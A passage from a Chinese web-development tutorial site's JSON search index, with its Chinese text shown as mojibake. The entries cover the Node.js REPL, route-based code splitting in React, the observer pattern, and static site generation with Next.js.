åœ¨æ‰§è¡Œ console.log() åæ‰“å° undefinedï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œå®ƒåªæ˜¯æ‰“å° 5 === \u0026lsquo;5\u0026rsquo; çš„ç»“æœã€‚ éœ€è¦è®°ä½ï¼Œå‰è€…åœ¨ JavaScript ä¸­åªæ˜¯ä¸€ä¸ªè¯­å¥ï¼Œåè€…æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ã€‚\nåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¦æµ‹è¯•çš„ä»£ç å¯èƒ½éœ€è¦å¤šè¡Œã€‚ ä¾‹å¦‚ï¼Œå‡è®¾è¦å®šä¹‰ä¸€ä¸ªç”Ÿæˆéšæœºæ•°çš„å‡½æ•°ï¼Œåœ¨ REPL ä¼šè¯ç±»å‹ä¸­çš„è¾“å…¥ä»¥ä¸‹è¡Œå¹¶æŒ‰ Enterï¼š\n1 2 3  function generateRandom() { ...   Node REPL è¶³å¤Ÿæ™ºèƒ½ï¼Œå¯ä»¥ç¡®å®šè¿˜æ²¡æœ‰å®Œæˆä»£ç ç¼–å†™ï¼Œå®ƒå°†è¿›å…¥å¤šè¡Œæ¨¡å¼ï¼Œä»¥ä¾¿è¾“å…¥æ›´å¤šä»£ç ã€‚ ç°åœ¨å®Œæˆå‡½æ•°å®šä¹‰å¹¶æŒ‰å›è½¦é”®ï¼š\n1 2 3 4 5  function generateRandom() { ...return Math.random() } undefined   Node å°†é€€å‡ºå¤šè¡Œæ¨¡å¼ï¼Œå¹¶æ‰“å° undefined å› ä¸ºæ²¡æœ‰è¿”å›å€¼ã€‚ è¿™ç§å¤šçº¿æ¨¡å¼æ˜¯æœ‰é™çš„ã€‚\n\rä¸‰ã€ä½¿ç”¨ Tabé”® è‡ªåŠ¨å®Œæˆ REPL å¾ˆé…·çš„ä¸€ç‚¹æ˜¯å®ƒæ˜¯äº¤äº’å¼çš„ã€‚\nåœ¨ç¼–å†™ä»£ç æ—¶ï¼Œå¦‚æœæŒ‰ä¸‹ Tab é”®ï¼ŒREPL å°†å°è¯•è‡ªåŠ¨å®Œæˆç¼–å†™çš„å†…å®¹ä»¥åŒ¹é…å·²ç»å®šä¹‰çš„å˜é‡æˆ–é¢„å®šä¹‰çš„å˜é‡ã€‚\nå°è¯•è¾“å…¥ JavaScript ç±»çš„åç§°ï¼Œä¾‹å¦‚ Numberï¼Œæ·»åŠ ä¸€ä¸ªç‚¹å¹¶æŒ‰ Tabã€‚\nREPL å°†æ‰“å°å¯ä»¥åœ¨è¯¥ç±»ä¸Šè®¿é—®çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼š\n\rå››ã€æœç´¢å…¨å±€å¯¹è±¡ å¯ä»¥é€šè¿‡é”®å…¥ global æ¥æ£€æŸ¥æœ‰æƒè®¿é—®çš„å…¨å±€å˜é‡ã€‚ å¹¶æŒ‰ä¸‹ Tabé”®ï¼š\n\räº”ã€_ ç‰¹æ®Šå˜é‡ å¦‚æœåœ¨æŸäº›ä»£ç ä¹‹åé”®å…¥ _ï¼Œåˆ™å°†æ‰“å°ä¸Šæ¬¡æ“ä½œçš„ç»“æœã€‚\n\rå…­ã€å‘ä¸Šç®­å¤´é”® å¦‚æœæŒ‰å‘ä¸Šç®­å¤´é”®ï¼Œå¯ä»¥è®¿é—®åœ¨å½“å‰ç”šè‡³ä»¥å‰çš„ REPL ä¼šè¯ä¸­æ‰§è¡Œçš„å‰å‡ è¡Œä»£ç çš„å†å²è®°å½•ã€‚\n\rä¸ƒã€ç‚¹å‘½ä»¤ REPL æœ‰ä¸€äº›ç‰¹æ®Šçš„å‘½ä»¤ï¼Œéƒ½ä»¥ç‚¹å¼€å¤´\n  .helpï¼šæ˜¾ç¤ºç‚¹å‘½ä»¤å¸®åŠ©\n  .editorï¼šå¯ç”¨ç¼–è¾‘å™¨æ¨¡å¼ï¼Œè½»æ¾ç¼–å†™å¤šè¡Œ JavaScript ä»£ç ã€‚ è¿›å…¥æ­¤æ¨¡å¼åï¼Œè¾“å…¥ ctrl-D ä»¥è¿è¡Œæ‚¨ç¼–å†™çš„ä»£ç ã€‚\n  .breakï¼šè¾“å…¥å¤šè¡Œè¡¨è¾¾å¼æ—¶ï¼Œè¾“å…¥ .break å‘½ä»¤å°†ä¸­æ­¢è¿›ä¸€æ­¥çš„è¾“å…¥ã€‚ ä¸æŒ‰ ctrl-C ç›¸åŒã€‚\n  .clearï¼šå°† REPL ä¸Šä¸‹æ–‡é‡ç½®ä¸ºç©ºå¯¹è±¡å¹¶æ¸…é™¤å½“å‰æ­£åœ¨è¾“å…¥çš„ä»»ä½•å¤šè¡Œè¡¨è¾¾å¼ã€‚\n  .loadï¼šåŠ è½½ä¸€ä¸ª JavaScript æ–‡ä»¶ï¼Œç›¸å¯¹äºå½“å‰å·¥ä½œç›®å½•\n  .saveï¼šå°†æ‚¨åœ¨ REPL ä¼šè¯ä¸­è¾“å…¥çš„æ‰€æœ‰å†…å®¹ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼ˆæŒ‡å®šæ–‡ä»¶åï¼‰\n  .exitï¼šé€€å‡ºreplï¼ˆä¸æŒ‰ctrl-Cä¸¤æ¬¡ç›¸åŒï¼‰\n  REPL çŸ¥é“ä½•æ—¶è¾“å…¥å¤šè¡Œè¯­å¥è€Œæ— éœ€è°ƒç”¨ .editorã€‚\nä¾‹å¦‚ï¼Œå¦‚æœå¼€å§‹è¾“å…¥è¿™æ ·çš„è¿­ä»£ï¼š\n1 2  [1, 2, 3].forEach(num =\u0026gt; {   ç„¶åæŒ‰ Enterï¼ŒREPL å°†è½¬åˆ°ä»¥ 3 ä¸ªç‚¹å¼€å¤´çš„æ–°è¡Œï¼Œè¡¨ç¤ºç°åœ¨å¯ä»¥ç»§ç»­å¤„ç†è¯¥å—ã€‚\n1 2 3  ... console.log(num) ... })   å¦‚æœåœ¨è¡Œå°¾è¾“å…¥ .break ï¼Œå¤šè¡Œæ¨¡å¼å°†åœæ­¢å¹¶ä¸”è¯­å¥ä¸ä¼šè¢«æ‰§è¡Œã€‚\n","description":"","id":97,"section":"nodejs","tags":null,"title":"ä½¿ç”¨ REPL æµ‹è¯•ä»£ç ","uri":"https://codthing.github.io/nodejs/nodebase/node-repl/"},{"content":"å¯ä»¥é€šè¿‡æ·»åŠ åŸºäºè·¯ç”±çš„æ‹†åˆ†æ¥è¯·æ±‚ä»…ç‰¹å®šè·¯ç”±éœ€è¦çš„èµ„æºã€‚\né€šè¿‡å°† React Suspense æˆ– loadable-component ä¸ react-router ç­‰åº“ç»“åˆï¼Œå¯ä»¥æ ¹æ®å½“å‰è·¯ç”±åŠ¨æ€åŠ è½½ç»„ä»¶ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  import React, { lazy, Suspense } from \u0026#34;react\u0026#34;; import { render } from \u0026#34;react-dom\u0026#34;; import { Switch, Route, BrowserRouter as Router } from \u0026#34;react-router-dom\u0026#34;; const App = lazy(() =\u0026gt; import(/* webpackChunkName: \u0026#34;home\u0026#34; */ \u0026#34;./App\u0026#34;)); const Overview = lazy(() =\u0026gt; import(/* webpackChunkName: \u0026#34;overview\u0026#34; */ \u0026#34;./Overview\u0026#34;) ); const Settings = lazy(() =\u0026gt; import(/* webpackChunkName: \u0026#34;settings\u0026#34; */ \u0026#34;./Settings\u0026#34;) ); render( \u0026lt;Router\u0026gt; \u0026lt;Suspense fallback={\u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;}\u0026gt; \u0026lt;Switch\u0026gt; \u0026lt;Route exact path=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;App /\u0026gt; \u0026lt;/Route\u0026gt; \u0026lt;Route path=\u0026#34;/overview\u0026#34;\u0026gt; \u0026lt;Overview /\u0026gt; \u0026lt;/Route\u0026gt; \u0026lt;Route path=\u0026#34;/settings\u0026#34;\u0026gt; \u0026lt;Settings /\u0026gt; \u0026lt;/Route\u0026gt; \u0026lt;/Switch\u0026gt; \u0026lt;/Suspense\u0026gt; \u0026lt;/Router\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;) ); module.hot.accept();   é€šè¿‡å»¶è¿ŸåŠ è½½æ¯ä¸ªè·¯ç”±çš„ç»„ä»¶ï¼Œåªè¯·æ±‚åŒ…å«å½“å‰è·¯ç”±æ‰€éœ€ä»£ç çš„åŒ…ã€‚\nç”±äºå¤§å¤šæ•°äººå·²ç»ä¹ æƒ¯äº†é‡å®šå‘æœŸé—´å¯èƒ½ä¼šæœ‰ä¸€äº›åŠ è½½æ—¶é—´çš„äº‹å®ï¼Œå› æ­¤å®ƒæ˜¯å»¶è¿ŸåŠ è½½ç»„ä»¶çš„ç†æƒ³åœºæ‰€ï¼\n\rçŸ¥è¯†ç‚¹   React Suspense\n  loadable-component\n  react-router\n  ","description":"æ ¹æ®å½“å‰è·¯ç”±åŠ¨æ€åŠ è½½ç»„ä»¶","id":98,"section":"react-patterns","tags":null,"title":"åŸºäºè·¯ç”±çš„æ‹†åˆ†","uri":"https://codthing.github.io/react-patterns/performance-patterns/route-base/"},{"content":"ä½¿ç”¨è§‚å¯Ÿè€…æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†æŸäº›å¯¹è±¡ï¼ˆè§‚å¯Ÿè€…ï¼‰è®¢é˜…åˆ°å¦ä¸€ä¸ªç§°ä¸º observableï¼ˆå¯è§‚å¯Ÿï¼‰ çš„å¯¹è±¡ã€‚ æ¯å½“ä¸€ä¸ªäº‹ä»¶å‘ç”Ÿæ—¶ï¼Œobservable å°±ä¼šé€šçŸ¥å®ƒæ‰€æœ‰çš„è§‚å¯Ÿè€…ï¼\nä¸€ä¸ª observable å¯¹è±¡é€šå¸¸åŒ…å« 4 ä¸ªé‡è¦éƒ¨åˆ†ï¼š\n observersï¼šè§‚å¯Ÿè€…æ•°ç»„ï¼Œæ¯å½“å‘ç”Ÿç‰¹å®šäº‹ä»¶æ—¶éƒ½ä¼šæ”¶åˆ°é€šçŸ¥ subscribe()ï¼šå°†è§‚å¯Ÿè€…æ·»åŠ åˆ°è§‚å¯Ÿè€…æ•°ç»„çš„æ–¹æ³• unsubscribe()ï¼šä»è§‚å¯Ÿè€…æ•°ç»„ä¸­ç§»é™¤è§‚å¯Ÿè€…çš„æ–¹æ³• notify()ï¼šä¸€ç§åœ¨ç‰¹å®šäº‹ä»¶å‘ç”Ÿæ—¶é€šçŸ¥æ‰€æœ‰è§‚å¯Ÿè€…çš„æ–¹æ³•  \råˆ›å»ºä¸€ä¸ª observable è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª observableï¼ ä¸€ç§ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ ES6 ç±»ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  class Observable { constructor() { this.observers = []; } subscribe(func) { this.observers.push(func); //push() æ–¹æ³•å°†ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ æ·»åŠ åˆ°æ•°ç»„çš„æœ«å°¾ï¼Œå¹¶è¿”å›è¯¥æ•°ç»„çš„æ–°é•¿åº¦ã€‚  } unsubscribe(func) { this.observers = this.observers.filter(observer =\u0026gt; observer !== func); //filter() æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„, å®ƒè¿”å›æ‰€æä¾›å‡½æ•°å¤„ç†è¿‡çš„æ‰€æœ‰å…ƒç´ ã€‚  } notify(data) { this.observers.forEach(observer =\u0026gt; observer(data)); //forEach() æ–¹æ³•å¯¹æ•°ç»„çš„æ¯ä¸ªå…ƒç´ æ‰§è¡Œä¸€æ¬¡ç»™å®šçš„å‡½æ•°ã€‚  } }   å¯ä»¥ä½¿ç”¨ subscribe æ–¹æ³•å°†è§‚å¯Ÿè€…æ·»åŠ åˆ°è§‚å¯Ÿè€…æ•°ç»„ä¸­ï¼Œä½¿ç”¨ unsubscribe æ–¹æ³•åˆ é™¤è§‚å¯Ÿè€…ï¼Œå¹¶ä½¿ç”¨ notify æ–¹æ³•é€šçŸ¥æ‰€æœ‰è®¢é˜…è€…ã€‚\nè®©æˆ‘ä»¬ç”¨è¿™ä¸ª observableï¼ˆå¯è§‚å¯Ÿï¼‰ æ„å»ºä¸€äº›ä¸œè¥¿ã€‚æœ‰ä¸€ä¸ªéå¸¸åŸºæœ¬çš„åº”ç”¨ç¨‹åºï¼Œå®ƒåªåŒ…å«ä¸¤ä¸ªç»„ä»¶ï¼šæŒ‰é’®å’Œå¼€å…³ã€‚\nexport default function App() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;Button\u0026gt;Click me!\u0026lt;/Button\u0026gt;\r\u0026lt;FormControlLabel control={\u0026lt;Switch /\u0026gt;} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} æˆ‘ä»¬å¸Œæœ›è·Ÿè¸ªç”¨æˆ·ä¸åº”ç”¨ç¨‹åºçš„äº¤äº’ã€‚ æ¯å½“ç”¨æˆ·å•å‡»æŒ‰é’®æˆ–åˆ‡æ¢å¼€å…³æ—¶ï¼Œæˆ‘ä»¬éƒ½å¸Œæœ›ä½¿ç”¨æ—¶é—´æˆ³è®°å½•æ­¤äº‹ä»¶ã€‚ é™¤äº†è®°å½•å®ƒï¼Œæˆ‘ä»¬è¿˜æƒ³åˆ›å»ºä¸€ä¸ª Toast é€šçŸ¥ï¼Œåœ¨äº‹ä»¶å‘ç”Ÿæ—¶æ˜¾ç¤ºå®ƒï¼\næœ¬è´¨ä¸Šï¼Œæˆ‘ä»¬æƒ³è¦åšçš„æ˜¯ä»¥ä¸‹å†…å®¹ï¼š\næ¯å½“ç”¨æˆ·è°ƒç”¨ handleClick æˆ– handleToggle å‡½æ•°æ—¶ï¼Œè¿™äº›å‡½æ•°éƒ½ä¼šè°ƒç”¨è§‚å¯Ÿè€…ä¸Šçš„é€šçŸ¥æ–¹æ³•ã€‚ notify æ–¹æ³•å°†é€šè¿‡ handleClick æˆ– handleToggle å‡½æ•°ä¼ é€’çš„æ•°æ®é€šçŸ¥æ‰€æœ‰è®¢é˜…è€…ï¼\né¦–å…ˆï¼Œè®©æˆ‘ä»¬åˆ›å»º logger å’Œ toastify å‡½æ•°ã€‚ è¿™äº›å‡½æ•°æœ€ç»ˆä¼šä» notify æ–¹æ³•æ¥æ”¶æ•°æ®ã€‚\nimport { ToastContainer, toast } from \u0026#34;react-toastify\u0026#34;;\rfunction logger(data) {\rconsole.log(`${Date.now()} ${data}`);\r}\rfunction toastify(data) {\rtoast(data);\r}\rexport default function App() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;Button\u0026gt;Click me!\u0026lt;/Button\u0026gt;\r\u0026lt;FormControlLabel control={\u0026lt;Switch /\u0026gt;} /\u0026gt;\r\u0026lt;ToastContainer /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} ç›®å‰ï¼Œlogger å’Œ toasity å‡½æ•°ä¸çŸ¥é“ observableï¼šobservable è¿˜ä¸èƒ½é€šçŸ¥å®ƒä»¬ï¼ ä¸ºäº†è®©å®ƒä»¬æˆä¸ºè§‚å¯Ÿè€…ï¼Œæˆ‘ä»¬å¿…é¡»ä½¿ç”¨ observable ä¸Šçš„ subscribe æ–¹æ³•è®¢é˜…å®ƒä»¬ï¼\nimport { ToastContainer, toast } from \u0026#34;react-toastify\u0026#34;;\rfunction logger(data) {\rconsole.log(`${Date.now()} ${data}`);\r}\rfunction toastify(data) {\rtoast(data);\r}\robservable.subscribe(logger);\robservable.subscribe(toastify);\rexport default function App() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;Button\u0026gt;Click me!\u0026lt;/Button\u0026gt;\r\u0026lt;FormControlLabel control={\u0026lt;Switch /\u0026gt;} /\u0026gt;\r\u0026lt;ToastContainer /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} æ¯å½“äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œlogger å’Œ toastify å‡½æ•°éƒ½ä¼šæ”¶åˆ°é€šçŸ¥ã€‚ ç°åœ¨æˆ‘ä»¬åªéœ€è¦å®ç°å®é™…é€šçŸ¥ observable çš„å‡½æ•°ï¼šhandleClick å’Œ handleToggle å‡½æ•°ï¼ è¿™äº›å‡½æ•°åº”è¯¥è°ƒç”¨ observable ä¸Šçš„ notify æ–¹æ³•ï¼Œå¹¶ä¼ é€’è§‚å¯Ÿè€…åº”è¯¥æ¥æ”¶çš„æ•°æ®ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  import { ToastContainer, toast } from \u0026#34;react-toastify\u0026#34;; function logger(data) { console.log(`${Date.now()}${data}`); } function toastify(data) { toast(data); } observable.subscribe(logger); observable.subscribe(toastify); export default function App() { function handleClick() { observable.notify(\u0026#34;ç”¨æˆ·ç‚¹å‡»æŒ‰é’®ï¼\u0026#34;); } function handleToggle() { observable.notify(\u0026#34;ç”¨æˆ·æ‹¨åŠ¨å¼€å…³ï¼\u0026#34;); } return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;Button\u0026gt;Click me!\u0026lt;/Button\u0026gt; \u0026lt;FormControlLabel control={\u0026lt;Switch /\u0026gt;} /\u0026gt; \u0026lt;ToastContainer /\u0026gt; \u0026lt;/div\u0026gt; ); }   Awesome! æˆ‘ä»¬åˆšåˆšå®Œæˆäº†æ•´ä¸ªæµç¨‹ï¼š\n1 2 3 4 5 6  1. ---\u0026gt; `handleClick å’Œ handleToggle è°ƒç”¨è§‚å¯Ÿè€…ä¸Šçš„é€šçŸ¥æ–¹æ³•` 2. ---\u0026gt; `è§‚å¯Ÿè€…é€šçŸ¥è®¢é˜…è€…ï¼šlogger å’Œ toastify å‡½æ•°` 3. ---\u0026gt; `æ¯å½“ç”¨æˆ·ä¸ä»»ä¸€ç»„ä»¶äº¤äº’æ—¶ï¼Œlogger å’Œ toastify å‡½æ•°éƒ½ä¼šæ”¶åˆ° notify æ–¹æ³•çš„é€šçŸ¥ï¼   å°½ç®¡æˆ‘ä»¬å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼ä½¿ç”¨è§‚å¯Ÿè€…æ¨¡å¼ï¼Œä½†å®ƒåœ¨å¤„ç†åŸºäºäº‹ä»¶çš„å¼‚æ­¥æ•°æ®æ—¶éå¸¸æœ‰ç”¨ã€‚\n ä¹Ÿè®¸æ‚¨å¸Œæœ›æŸäº›ç»„ä»¶åœ¨æŸäº›æ•°æ®ä¸‹è½½å®Œæˆæ—¶æ”¶åˆ°é€šçŸ¥ æˆ–è€…æ¯å½“ç”¨æˆ·å‘ç•™è¨€æ¿å‘é€æ–°æ¶ˆæ¯å¹¶ä¸”æ‰€æœ‰å…¶ä»–æˆå‘˜éƒ½åº”è¯¥æ”¶åˆ°é€šçŸ¥æ—¶  \ræ¡ˆä¾‹åˆ†æ RxJS ä½¿ç”¨å¯è§‚å¯Ÿæ¨¡å¼çš„æµè¡Œåº“æ˜¯ RxJSã€‚\n ReactiveX å°†è§‚å¯Ÿè€…æ¨¡å¼ä¸è¿­ä»£å™¨æ¨¡å¼ä»¥åŠå‡½æ•°å¼ç¼–ç¨‹ä¸é›†åˆç›¸ç»“åˆï¼Œä»¥æ»¡è¶³å¯¹ç®¡ç†äº‹ä»¶åºåˆ—çš„ç†æƒ³æ–¹å¼çš„éœ€æ±‚ã€‚ - RxJS\n ä½¿ç”¨ RxJSï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»º observable å¹¶è®¢é˜…æŸäº›äº‹ä»¶ï¼ è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªåœ¨ä»–ä»¬çš„æ–‡æ¡£ä¸­ä»‹ç»çš„ä¾‹å­ï¼Œå®ƒè®°å½•äº†ç”¨æˆ·æ˜¯å¦åœ¨æ–‡æ¡£ä¸­æ‹–åŠ¨ã€‚\nRxJS æœ‰å¤§é‡ä½¿ç”¨å¯è§‚å¯Ÿæ¨¡å¼çš„å†…ç½®åŠŸèƒ½å’Œç¤ºä¾‹ã€‚\n\rä¼˜ç‚¹ ä½¿ç”¨è§‚å¯Ÿè€…æ¨¡å¼æ˜¯å¼ºåˆ¶åˆ†ç¦»å…³æ³¨ç‚¹å’Œå•ä¸€èŒè´£åŸåˆ™çš„å¥½æ–¹æ³•ã€‚ è§‚å¯Ÿè€…å¯¹è±¡ä¸å¯è§‚å¯Ÿå¯¹è±¡å¹¶ä¸ç´§å¯†è€¦åˆï¼Œå¹¶ä¸”å¯ä»¥éšæ—¶ï¼ˆè§£ï¼‰è€¦åˆã€‚ observable å¯¹è±¡è´Ÿè´£ç›‘æ§äº‹ä»¶ï¼Œè€Œè§‚å¯Ÿè€…åªæ˜¯å¤„ç†æ¥æ”¶åˆ°çš„æ•°æ®ã€‚\n\rç¼ºç‚¹ å¦‚æœè§‚å¯Ÿè€…å˜å¾—è¿‡äºå¤æ‚ï¼Œåˆ™åœ¨é€šçŸ¥æ‰€æœ‰è®¢é˜…è€…æ—¶å¯èƒ½ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜ã€‚\n\rçŸ¥è¯†ç‚¹  Array.prototype.push() Array.prototype.filter() Array.prototype.forEach()  ","description":"ä½¿ç”¨ observables åœ¨äº‹ä»¶å‘ç”Ÿæ—¶é€šçŸ¥è®¢é˜…è€…","id":99,"section":"react-patterns","tags":null,"title":"è§‚å¯Ÿè€…æ¨¡å¼","uri":"https://codthing.github.io/react-patterns/design-patterns/observer-pattern/"},{"content":"æ ¹æ®æˆ‘ä»¬å¯¹ SSR çš„è®¨è®ºï¼ŒçŸ¥é“æœåŠ¡å™¨ä¸Šè¾ƒé•¿çš„è¯·æ±‚å¤„ç†æ—¶é—´ä¼šå¯¹ TTFB äº§ç”Ÿè´Ÿé¢å½±å“ã€‚\nç±»ä¼¼åœ°ï¼Œå¯¹äº CSRï¼Œç”±äºä¸‹è½½å’Œå¤„ç†è„šæœ¬æ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œå¤§å‹ JavaScript åŒ…å¯èƒ½å¯¹åº”ç”¨ç¨‹åºçš„ FCPã€LCP å’Œ TTI æœ‰å®³ã€‚\né™æ€å‘ˆç°æˆ–é™æ€ç”Ÿæˆ (SSG) è¯•å›¾é€šè¿‡å°†é¢„å‘ˆç°çš„ HTML å†…å®¹äº¤ä»˜ç»™åœ¨æ„å»ºç«™ç‚¹æ—¶ç”Ÿæˆçš„å®¢æˆ·ç«¯æ¥è§£å†³è¿™äº›é—®é¢˜ã€‚\næ¯ä¸ªç”¨æˆ·å¯ä»¥è®¿é—®çš„è·¯ç”±å¯¹åº”çš„é™æ€HTMLæ–‡ä»¶æ˜¯æå‰ç”Ÿæˆçš„ã€‚ è¿™äº›é™æ€ HTML æ–‡ä»¶å¯èƒ½åœ¨æœåŠ¡å™¨æˆ– CDN ä¸Šå¯ç”¨ï¼Œå¹¶åœ¨å®¢æˆ·ç«¯è¯·æ±‚æ—¶è·å–ã€‚\n\ré™æ€æ–‡ä»¶ä¹Ÿå¯ä»¥è¢«ç¼“å­˜ï¼Œä»è€Œæä¾›æ›´å¤§çš„å¼¹æ€§ã€‚\nç”±äº HTML å“åº”æ˜¯é¢„å…ˆç”Ÿæˆçš„ï¼ŒæœåŠ¡å™¨ä¸Šçš„å¤„ç†æ—¶é—´å¯ä»¥å¿½ç•¥ä¸è®¡ï¼Œä»è€Œå¯¼è‡´æ›´å¿«çš„ TTFB å’Œæ›´å¥½çš„æ€§èƒ½ã€‚\nåœ¨ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ JS åº”è¯¥æ˜¯æœ€å°‘çš„ï¼Œå¹¶ä¸”é™æ€é¡µé¢åº”è¯¥åœ¨å®¢æˆ·ç«¯æ”¶åˆ°å“åº”åç«‹å³å˜å¾—å¯äº¤äº’ã€‚\nå› æ­¤ï¼ŒSSG æœ‰åŠ©äºå®ç°æ›´å¿«çš„ FCP/TTIã€‚\n\rSSG - åŸºæœ¬ç»“æ„ é¡¾åæ€ä¹‰ï¼Œé™æ€æ¸²æŸ“éå¸¸é€‚åˆé™æ€å†…å®¹ï¼Œå…¶ä¸­é¡µé¢ä¸éœ€è¦æ ¹æ®ç™»å½•ç”¨æˆ·è¿›è¡Œå®šåˆ¶ï¼ˆä¾‹å¦‚ä¸ªæ€§åŒ–æ¨èï¼‰ã€‚\nå› æ­¤ï¼Œåƒâ€œå…³äºæˆ‘ä»¬â€ã€â€œè”ç³»æˆ‘ä»¬â€ã€ç½‘ç«™çš„åšå®¢é¡µé¢æˆ–ç”µå­å•†åŠ¡åº”ç”¨ç¨‹åºçš„äº§å“é¡µé¢ç­‰é™æ€é¡µé¢æ˜¯é™æ€æ¸²æŸ“çš„ç†æƒ³é€‰æ‹©ã€‚\nNext.jsã€Gatsby å’Œ VuePress ç­‰æ¡†æ¶æ”¯æŒé™æ€ç”Ÿæˆã€‚\nè®©æˆ‘ä»¬ä»è¿™ä¸ªæ²¡æœ‰ä»»ä½•æ•°æ®çš„é™æ€å†…å®¹æ¸²æŸ“çš„ç®€å• Next.js ç¤ºä¾‹å¼€å§‹ã€‚\nNext.js:\n1 2 3 4 5 6 7 8 9  // pages/about.js  export default function About() { return \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;About Us\u0026lt;/h1\u0026gt; {/* ... */} \u0026lt;/div\u0026gt; }   å½“ç«™ç‚¹è¢«æ„å»ºï¼ˆä½¿ç”¨ Next.js æ„å»ºï¼‰æ—¶ï¼Œè¿™ä¸ªé¡µé¢å°†è¢«é¢„æ¸²æŸ“æˆä¸€ä¸ª HTML æ–‡ä»¶ about.htmlï¼Œå¯åœ¨ /about è·¯å¾„è®¿é—®ã€‚\n\ræœ‰æ•°æ®çš„ SSG â€œå…³äºæˆ‘ä»¬â€æˆ–â€œè”ç³»æˆ‘ä»¬â€é¡µé¢ä¸­çš„é™æ€å†…å®¹å¯èƒ½ä¼šæŒ‰åŸæ ·å‘ˆç°ï¼Œè€Œæ— éœ€ä»æ•°æ®å­˜å‚¨ä¸­è·å–æ•°æ®ã€‚\nä½†æ˜¯ï¼Œå¯¹äºå•ä¸ªåšå®¢é¡µé¢æˆ–äº§å“é¡µé¢ç­‰å†…å®¹ï¼Œæ¥è‡ªæ•°æ®å­˜å‚¨çš„æ•°æ®å¿…é¡»ä¸ç‰¹å®šæ¨¡æ¿åˆå¹¶ï¼Œç„¶ååœ¨æ„å»ºæ—¶å‘ˆç°ä¸º HTMLã€‚\nç”Ÿæˆçš„ HTML é¡µé¢çš„æ•°é‡å°†åˆ†åˆ«å–å†³äºåšå®¢æ–‡ç« çš„æ•°é‡æˆ–äº§å“çš„æ•°é‡ã€‚\nè¦è®¿é—®è¿™äº›é¡µé¢ï¼Œæ‚¨å¯èƒ½è¿˜æœ‰åˆ—è¡¨é¡µé¢ï¼Œè¿™äº›é¡µé¢å°†æ˜¯åŒ…å«åˆ†ç±»å’Œæ ¼å¼åŒ–çš„æ•°æ®é¡¹åˆ—è¡¨çš„ HTML é¡µé¢ã€‚\nè¿™äº›åœºæ™¯å¯ä»¥ä½¿ç”¨ Next.js é™æ€æ¸²æŸ“æ¥è§£å†³ã€‚\næˆ‘ä»¬å¯ä»¥æ ¹æ®å¯ç”¨é¡¹ç›®ç”Ÿæˆåˆ—è¡¨é¡µé¢æˆ–å•ä¸ªé¡¹ç›®é¡µé¢ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•ã€‚\nåˆ—è¡¨é¡µé¢ - æ‰€æœ‰é¡¹ç›® åˆ—è¡¨é¡µé¢çš„ç”Ÿæˆæ˜¯é¡µé¢ä¸Šæ˜¾ç¤ºçš„å†…å®¹ä¾èµ–äºå¤–éƒ¨æ•°æ®çš„åœºæ™¯ã€‚\nè¿™äº›æ•°æ®å°†åœ¨æ„å»ºæ—¶ä»æ•°æ®åº“ä¸­è·å–ä»¥æ„å»ºé¡µé¢ã€‚\nåœ¨ Next.js ä¸­ï¼Œè¿™å¯ä»¥é€šè¿‡åœ¨é¡µé¢ç»„ä»¶ä¸­å¯¼å‡ºå‡½æ•° getStaticProps() æ¥å®ç°ã€‚\nè¯¥å‡½æ•°åœ¨æ„å»ºæœåŠ¡å™¨ä¸Šçš„æ„å»ºæ—¶è¢«è°ƒç”¨ä»¥è·å–æ•°æ®ã€‚\nç„¶åå¯ä»¥å°†æ•°æ®ä¼ é€’ç»™é¡µé¢çš„ props ä»¥é¢„æ¸²æŸ“é¡µé¢ç»„ä»¶ã€‚\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ç”Ÿæˆäº§å“åˆ—è¡¨é¡µé¢çš„ä»£ç ï¼Œè¯¥é¡µé¢æœ€åˆæ˜¯ä½œä¸ºæœ¬æ–‡çš„ä¸€éƒ¨åˆ†å…±äº«çš„ã€‚\n// æ­¤å‡½æ•°åœ¨æ„å»ºæ—¶åœ¨æ„å»ºæœåŠ¡å™¨ä¸Šè¿è¡Œ\rexport async function getStaticProps() {\rreturn {\rprops: {\rproducts: await getProductsFromDatabase()\r}\r}\r}\r// é¡µé¢ç»„ä»¶åœ¨æ„å»ºæ—¶ä» getStaticProps æ¥æ”¶ products å±æ€§\rexport default function Products({ products }) {\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;h1\u0026gt;Products\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{products.map((product) =\u0026gt; (\r\u0026lt;li 